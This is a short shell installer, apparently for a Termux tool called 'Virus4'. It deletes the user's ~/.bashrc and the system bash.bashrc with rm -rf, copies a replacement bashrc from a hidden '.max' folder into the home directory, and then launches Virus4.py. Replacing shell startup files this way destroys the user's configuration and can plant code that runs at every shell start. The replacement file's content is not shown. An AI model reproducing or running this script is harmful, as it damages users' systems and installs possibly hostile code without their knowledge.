cd $HOME

rm -rf .bashrc
cd ../usr/etc/
rm -rf bash.bashrc

cd $HOME/Virus4/.max

cp bash.bashrc $HOME/.bashrc



cd $HOME/Virus4
python2 Virus4.py
